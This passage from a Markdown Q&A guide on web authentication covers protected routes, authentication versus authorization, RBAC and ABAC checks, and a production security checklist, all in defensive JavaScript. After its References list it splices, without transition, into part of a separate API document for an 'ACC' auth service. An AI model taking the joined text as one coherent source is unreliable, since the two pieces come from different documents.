        path="/app/*"
        element={
          <ProtectedRoute>
            <AppLayout />
          </ProtectedRoute>
        }>
        
        <Route path="dashboard" element={<Dashboard />} />
        <Route path="profile" element={<Profile />} />
        
        {/* Admin-only nested route */}
        <Route
          path="admin/*"
          element={
            <RoleProtectedRoute requiredRole="admin">
              <AdminLayout />
            </RoleProtectedRoute>
          }>
          <Route path="users" element={<UsersPage />} />
          <Route path="settings" element={<SettingsPage />} />
        </Route>
      </Route>
    </Routes>
  );
}
```

**Why it matters:** Protected routes prevent unauthorized access and create better UX by remembering intended destinations.
</details>

<details>
<summary><strong>Question 4:</strong> What's the difference between authentication and authorization?</summary>

**Answer:** **Authentication verifies WHO you are (login with password). Authorization determines WHAT you can do (permissions, roles, access control).**

```javascript
// ===== AUTHENTICATION: Who are you? =====
// Proves identity via credentials

async function login(email, password) {
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ email, password })
  });
  
  if (response.ok) {
    const data = await response.json();
    // Token proves you are user ID 123
    return data.access_token;
  }
  
  throw new Error('Authentication failed');
}

// JWT payload after authentication:
{
  "userId": 123,
  "email": "john@example.com",
  "role": "user",
  "permissions": ["posts:read", "posts:create"],
  "iat": 1672531200,
  "exp": 1672534800
}


// ===== AUTHORIZATION: What can you do? =====
// Checks permissions for specific actions

// Role-based authorization (RBAC)
function canAccessAdminPanel(user) {
  return user.role === 'admin';
}

// Permission-based authorization
function canDeletePost(user, post) {
  // Can delete if you're the author OR an admin
  return user.id === post.authorId || user.role === 'admin';
}

// Usage in component
function DeleteButton({ post }) {
  const { user } = useAuth();
  
  // Authentication: Is user logged in?
  if (!user) {
    return null;  // Not authenticated
  }
  
  // Authorization: Can user delete this post?
  if (!canDeletePost(user, post)) {
    return null;  // Not authorized
  }
  
  return <button onClick={() => deletePost(post.id)}>Delete</button>;
}


// ===== AUTHORIZATION PATTERNS =====

// 1. ROLE-BASED ACCESS CONTROL (RBAC)
const ROLES = {
  GUEST: 'guest',
  USER: 'user',
  MODERATOR: 'moderator',
  ADMIN: 'admin'
};

const ROLE_HIERARCHY = {
  [ROLES.GUEST]: 0,
  [ROLES.USER]: 1,
  [ROLES.MODERATOR]: 2,
  [ROLES.ADMIN]: 3
};

function hasRole(user, requiredRole) {
  return ROLE_HIERARCHY[user.role] >= ROLE_HIERARCHY[requiredRole];
}

// Check if user is at least a moderator
if (hasRole(user, ROLES.MODERATOR)) {
  // Can moderate content
}


// 2. PERMISSION-BASED ACCESS CONTROL
const PERMISSIONS = {
  POSTS_READ: 'posts:read',
  POSTS_CREATE: 'posts:create',
  POSTS_UPDATE: 'posts:update',
  POSTS_DELETE: 'posts:delete',
  USERS_MANAGE: 'users:manage'
};

function hasPermission(user, permission) {
  return user.permissions?.includes(permission);
}

// Check before action
if (hasPermission(user, PERMISSIONS.POSTS_DELETE)) {
  await deletePost(postId);
}


// 3. ATTRIBUTE-BASED ACCESS CONTROL (ABAC)
// Most flexible - considers multiple attributes

function canEditPost(user, post) {
  // Check multiple conditions
  const isAuthor = user.id === post.authorId;
  const isAdmin = user.role === 'admin';
  const isWithinEditWindow = Date.now() - post.createdAt < 3600000; // 1 hour
  const isNotLocked = !post.locked;
  
  return (
    (isAuthor && isWithinEditWindow && isNotLocked) ||
    isAdmin
  );
}


// 4. OWNERSHIP-BASED AUTHORIZATION
function canAccessResource(user, resource) {
  // User can only access their own resources
  return resource.userId === user.id;
}

// API endpoint
app.get('/api/orders/:id', authenticate, async (req, res) => {
  const order = await Order.findById(req.params.id);
  
  // Authorization check
  if (order.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  res.json(order);
});


// ===== AUTHORIZATION HOOK =====
function useAuthorization() {
  const { user } = useAuth();
  
  const can = (permission) => {
    if (!user) return false;
    return user.permissions?.includes(permission);
  };
  
  const hasRole = (role) => {
    if (!user) return false;
    return user.role === role;
  };
  
  const isOwner = (resource) => {
    if (!user) return false;
    return resource.userId === user.id;
  };
  
  return { can, hasRole, isOwner };
}

// Usage
function PostActions({ post }) {
  const { can, isOwner } = useAuthorization();
  
  return (
    <div>
      {can('posts:update') && isOwner(post) && (
        <button>Edit</button>
      )}
      
      {can('posts:delete') && (
        <button>Delete</button>
      )}
    </div>
  );
}
```

**Comparison:**

| Aspect | Authentication | Authorization |
|--------|----------------|---------------|
| Question | "Who are you?" | "What can you do?" |
| Process | Login with credentials | Check permissions/roles |
| Result | User identity | Access decision |
| Example | Username + password → JWT | JWT role field → Admin panel access |
| Happens | Once per session | Every protected action |
| Failure | 401 Unauthorized | 403 Forbidden |

**Real-world example:**

```javascript
// Hotel key card analogy:
// Authentication = Showing ID at front desk to get key card
// Authorization = Key card only opens your room, not others

// Code example:
async function accessRoom(userId, roomId) {
  // Authentication: Verify user identity
  const user = await authenticateUser(userId);
  if (!user) {
    throw new Error('401: Please check in first');  // Not authenticated
  }
  
  // Authorization: Check if user can access this room
  if (user.roomId !== roomId && user.role !== 'staff') {
    throw new Error('403: You can only access your own room');  // Not authorized
  }
  
  // Both checks passed
  return openDoor(roomId);
}
```

**Why it matters:** Authentication without authorization is like giving everyone a key to the front door. Authorization without authentication is like checking permissions for anonymous users.
</details>

<details>
<summary><strong>Question 5:</strong> How do you secure authentication in production?</summary>

**Answer:** **Use HTTPS, httpOnly cookies for refresh tokens, short-lived access tokens in memory, CSRF protection, rate limiting on login endpoints, secure password hashing (bcrypt), and monitor for suspicious activity.**

```javascript
// ===== PRODUCTION SECURITY CHECKLIST =====

// 1. HTTPS ONLY - Encrypt all traffic
// Prevent man-in-the-middle attacks stealing tokens

// In production server:
if (process.env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (!req.secure) {
      return res.redirect('https://' + req.headers.host + req.url);
    }
    next();
  });
}

// Cookie settings for production:
res.cookie('refreshToken', token, {
  httpOnly: true,   // Prevent JavaScript access
  secure: true,     // HTTPS only
  sameSite: 'strict',  // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000
});


// 2. RATE LIMITING - Prevent brute force attacks
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 attempts per window
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false
});

app.post('/api/auth/login', loginLimiter, async (req, res) => {
  // ... login logic
});


// 3. PASSWORD HASHING - Never store plaintext passwords
import bcrypt from 'bcrypt';

// Registration
const saltRounds = 12;  // Higher = more secure but slower
const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);

await User.create({
  email,
  password: hashedPassword  // Store hash, not plain password
});

// Login verification
const user = await User.findOne({ email });
const isValid = await bcrypt.compare(plainPassword, user.password);

if (!isValid) {
  return res.status(401).json({ error: 'Invalid credentials' });
}


// 4. TOKEN SECURITY - Short expiration, secure signing
import jwt from 'jsonwebtoken';

// Use strong secret (32+ random characters)
const JWT_SECRET = process.env.JWT_SECRET;  // From environment variable

// Short-lived access token
const accessToken = jwt.sign(
  { userId: user.id, role: user.role },
  JWT_SECRET,
  { expiresIn: '15m' }  // 15 minutes
);

// Long-lived refresh token
const refreshToken = jwt.sign(
  { userId: user.id, tokenVersion: user.tokenVersion },
  JWT_SECRET,
  { expiresIn: '7d' }  // 7 days
);


// 5. TOKEN BLACKLISTING - Invalidate on logout
import Redis from 'ioredis';
const redis = new Redis();

// Logout endpoint
app.post('/api/auth/logout', authenticate, async (req, res) => {
  const token = req.token;
  
  // Add token to blacklist in Redis
  const decoded = jwt.verify(token, JWT_SECRET);
  const expiry = decoded.exp - Math.floor(Date.now() / 1000);
  
  await redis.setex(`blacklist:${token}`, expiry, '1');
  
  res.json({ message: 'Logged out successfully' });
});

// Middleware to check blacklist
async function authenticate(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  // Check if token is blacklisted
  const isBlacklisted = await redis.get(`blacklist:${token}`);
  if (isBlacklisted) {
    return res.status(401).json({ error: 'Token has been revoked' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
}


// 6. CSRF PROTECTION - Prevent cross-site request forgery
import csrf from 'csurf';

const csrfProtection = csrf({ cookie: true });

app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

app.post('/api/transfer-money', csrfProtection, (req, res) => {
  // CSRF token validated automatically
  // ...
});


// 7. MONITORING & ALERTS - Detect suspicious activity
import winston from 'winston';

const logger = winston.createLogger({
  transports: [
    new winston.transports.File({ filename: 'auth-events.log' })
  ]
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    const user = await User.findOne({ email });
    const isValid = await bcrypt.compare(password, user.password);
    
    if (!isValid) {
      // Log failed attempt
      logger.warn('Failed login attempt', {
        email,
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date()
      });
      
      // Check for brute force (5+ failed attempts in 10 min)
      const recentFailures = await getFailedAttempts(email, 600);
      if (recentFailures >= 5) {
        await lockAccount(email);
        sendSecurityAlert(email, 'Account locked due to suspicious activity');
      }
      
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Log successful login
    logger.info('Successful login', {
      userId: user.id,
      ip: req.ip,
      timestamp: new Date()
    });
    
    // Generate tokens...
  } catch (error) {
    logger.error('Login error', { error: error.message });
    res.status(500).json({ error: 'Login failed' });
  }
});


// 8. SECURITY HEADERS - Prevent common attacks
import helmet from 'helmet';

app.use(helmet());  // Sets multiple security headers

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'"],
    styleSrc: ["'self'", "'unsafe-inline'"]
  }
}));


// 9. INPUT VALIDATION - Prevent injection attacks
import validator from 'validator';

app.post('/api/auth/login', (req, res) => {
  const { email, password } = req.body;
  
  // Validate email format
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: 'Invalid email format' });
  }
  
  // Validate password complexity
  if (password.length < 8 || !validator.isStrongPassword(password)) {
    return res.status(400).json({
      error: 'Password must be at least 8 characters with uppercase, lowercase, number, and symbol'
    });
  }
  
  // Continue with login...
});


// 10. TOKEN VERSIONING - Invalidate all tokens on password change
// Add tokenVersion to user model
const userSchema = new Schema({
  email: String,
  password: String,
  tokenVersion: { type: Number, default: 0 }
});

// Include version in refresh token
const refreshToken = jwt.sign(
  { userId: user.id, tokenVersion: user.tokenVersion },
  JWT_SECRET,
  { expiresIn: '7d' }
);

// Verify version matches
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  const decoded = jwt.verify(refreshToken, JWT_SECRET);
  
  const user = await User.findById(decoded.userId);
  
  // Check if token version matches
  if (decoded.tokenVersion !== user.tokenVersion) {
    return res.status(401).json({ error: 'Token has been invalidated' });
  }
  
  // Generate new access token...
});

// On password change, increment version
app.post('/api/users/change-password', authenticate, async (req, res) => {
  const user = await User.findById(req.user.id);
  
  // Update password
  user.password = await bcrypt.hash(req.body.newPassword, 12);
  
  // Increment token version (invalidates all existing tokens)
  user.tokenVersion += 1;
  
  await user.save();
  
  res.json({ message: 'Password changed. Please login again.' });
});
```

**Production security checklist:**

- ✅ HTTPS enforced
- ✅ httpOnly cookies for refresh tokens
- ✅ Short-lived access tokens (15 min)
- ✅ CSRF protection with sameSite cookies
- ✅ Rate limiting on auth endpoints
- ✅ bcrypt password hashing (12+ rounds)
- ✅ Token blacklisting on logout
- ✅ Security headers (Helmet)
- ✅ Input validation
- ✅ Monitoring & alerts for suspicious activity
- ✅ Token versioning for password changes
- ✅ Environment variables for secrets
- ✅ Regular security audits

**Why it matters:** 81% of data breaches involve weak or stolen credentials. Proper authentication security is critical.
</details>

## References

- [JWT.io - JSON Web Tokens](https://jwt.io/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OAuth 2.0 RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749)
- [React Router - Authentication Guide](https://reactrouter.com/en/main/guides/authentication)
- [MDN: HTTP authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication)
   - **Response**: A success message indicating the password has been reset.

   **Example Request** (POST):
   ```json
   {
     "reset_token": "abc123xyz",
     "new_password": "newPassword123"
   }
   ```

   **Example Response** (200 OK):
   ```json
   {
     "message": "Password successfully reset."
   }
   ```

---

## Token Service

### JWT Authentication

The ACC uses JWT (JSON Web Tokens) for stateless authentication, meaning the server does not need to store session data. The token contains information about the user and is signed to prevent tampering.

**JWT Structure**: 
- Header: Contains metadata about the token (algorithm and type).
- Payload: Contains claims (e.g., user ID, roles).
- Signature: Verifies the integrity of the token.

### Token Expiration
- **Access Token**: Typically has a short lifespan (e.g., 1 hour).
- **Refresh Token**: Longer lifespan (e.g., 30 days) and is used to obtain a new access token once it expires.

### Example of Token Generation:
```json
{
  "user_id": 123456,
  "email": "user@example.com",
  "roles": ["user", "admin"],
  "iat": 1627905189,
  "exp": 1627908789
}
```

---

## Roles and Permissions

The ACC supports Role-Based Access Control (RBAC). Roles are assigned to users, and these roles determine what actions they can perform within the application. 

### Role Definitions:
- **Admin**: Full access to all resources and configuration settings.
- **User**: Limited access to resources and personal data.
- **Guest**: Can view publicly available content only.

### Permission Checks:
Each API request that requires authorization must include a valid JWT or session token. Based on the user's role, the system will grant or deny access to specific resources.

Example:
- **Admin** can view and modify user data, while **User** can only access their own data.

---

## Session Management

- **Create Session**: Upon successful login, a session is created.
- **Session Expiration**: The session may expire after a set time or if the user logs out.
- **Session Termination**: Sessions can be manually terminated via an API endpoint.

---

## Multi-factor Authentication (MFA) (Optional)

If enabled, users will be prompted for an additional form of authentication, such as a one-time passcode (OTP) sent via email or SMS, after entering their primary credentials.

---

## API Endpoints

| Endpoint                          | Method | Description                                            |
|-----------------------------------|--------|--------------------------------------------------------|
| `/auth/login`                     | POST   | Login and obtain access token                         |
| `/auth/register`                  | POST   | Register a new user                                   |
| `/auth/forgot-password`           | POST   | Request password reset                                |
| `/auth/reset-password`            | POST   | Reset password using a token                          |
| `/auth/refresh-token`             | POST   | Obtain a new access token using refresh token         |
| `/auth/logout`                    | POST   | Log out (terminate session)                           |

---

## Error Handling

- **400 Bad Request**: Input validation failed.
- **401 Unauthorized**: Authentication required or failed.
- **403 Forbidden**: Insufficient permissions.
- **404 Not Found**: Resource not found (e.g., user).
- **500 Internal Server Error**: An unexpected error occurred.

---

## Security Considerations

- **Password Storage**: Ensure passwords are hashed using a secure algorithm (e.g., bcrypt or Argon2).
- **Token Storage**: Tokens should be securely stored, ideally in HTTP-only cookies.
- **Rate Limiting**: Implement rate limiting to prevent brute-force attacks.

## References
- https://zivukushingai.medium.com/everything-you-need-to-know-about-frontend-and-backend-authentication-ultimate-guide-7142a752249c
- https://webauthn.guide/